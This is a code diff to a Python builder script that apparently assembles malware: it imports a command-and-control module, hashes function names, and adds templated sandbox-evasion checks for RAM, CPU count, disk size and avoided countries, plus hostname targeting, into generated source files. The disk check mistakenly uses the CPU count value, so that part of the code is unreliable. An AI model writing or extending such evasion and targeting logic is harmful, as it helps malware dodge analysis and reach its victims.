@@ -1,6 +1,7 @@
 from configparser import ConfigParser
 from scripts.hasher import hash
 from scripts.config import parse_config
+from scripts.templating import *
 from scripts.dict import dictionary_encrypt
 from scripts.utils import *
 from scripts.c2 import *
@@ -81,13 +82,34 @@ def main():
             if parts[0] == "FCTHASH": # definitions.c
                 sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
             if parts[0] == "SANDBOX":
+                if parts[1] == "RAM_CHECK":
+                    if is_set(RAM_SIZE):
+                        template = get_template("RAM_CHECK")
+                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", RAM_SIZE))
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "")
+                if parts[1] == "CPU_CHECK":
+                    if is_set(CPU_COUNT):
+                        template = get_template("CPU_CHECK")
+                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "")
+                if parts[1] == "DISK_CHECK":
+                    if is_set(CPU_COUNT):
+                        template = get_template("DISK_CHECK")
+                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "")
+                if parts[1] == "COUNTRY_CHECK":
+                    if len(AVOID_COUNTRIES):
+                        template = get_template("COUNTRY_CHECK")
+                        sed_file(WORKING_FOLDER+filename, tag, template)
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "")
+
+                # ------OLD----------
                 if parts[1] == "DISKSIZE":
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
-                if parts[1] == "CPU_COUNT":
-                    print("CPU_COUNT: ", CPU_COUNT)
-                    sed_file(WORKING_FOLDER+filename, tag, CPU_COUNT)
-                if parts[1] == "RAM_SIZE":
-                    sed_file(WORKING_FOLDER+filename, tag, RAM_SIZE)
                 if parts[1] == "TARGET_HOSTNAME":
                     if len(TARGET_HOSTNAME):
                         sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
